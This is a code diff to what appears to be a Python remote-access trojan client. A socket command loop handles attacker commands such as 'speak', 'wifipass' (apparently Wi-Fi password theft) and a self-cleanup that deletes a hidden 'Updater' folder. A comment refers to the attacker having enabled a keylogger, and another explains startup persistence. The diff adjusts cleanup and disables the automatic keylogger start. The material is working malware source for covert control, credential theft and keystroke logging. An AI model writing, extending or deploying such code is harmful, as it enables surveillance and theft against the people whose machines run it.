@@ -333,6 +333,7 @@ def run_commands():
                 has_ben_defed = 1
             data_d = data[:].decode("utf-8")
             Directory = re.match("(?:cd) (.*)", data_d)
+            print(data[:].decode("utf-8").lower().strip())
             ldata = data[:].decode("utf-8").lower().strip()
             print("LDATA: " + ldata)
             if "speak " in ldata:
@@ -384,7 +385,7 @@ def run_commands():
                     connection.send(str.encode("nan"))
                 else:
                     connection.send(str.encode("ending"))
-                    os.rmdir("C:\\Users\\" + getpass.getuser() + "\\Updater")
+                    shutil.rmtree("C:\\Users\\" + getpass.getuser() + "\\Updater", ignore_errors=True)
             elif ldata == "wifipass" or ldata == "wifi pass":
                 pn = 0
                 while True:
@@ -456,9 +457,9 @@ def run_commands():
         run_commands()
 
 
-if os.path.isfile("C:\\Users\\" + getpass.getuser() + "\\Updater\\updateDDDMA.txt"):
-    # Attacker has enabled keylogger on this machine before
-    start_keylogger()
+# if os.path.isfile("C:\\Users\\" + getpass.getuser() + "\\Updater\\updateDDDMA.txt"):
+#     # Attacker has enabled keylogger on this machine before
+#     start_keylogger()
 
 # start_up()
 # If you uncomment the line above, the file will be added to the startup directory to that the client will start up everytime the computer turns on
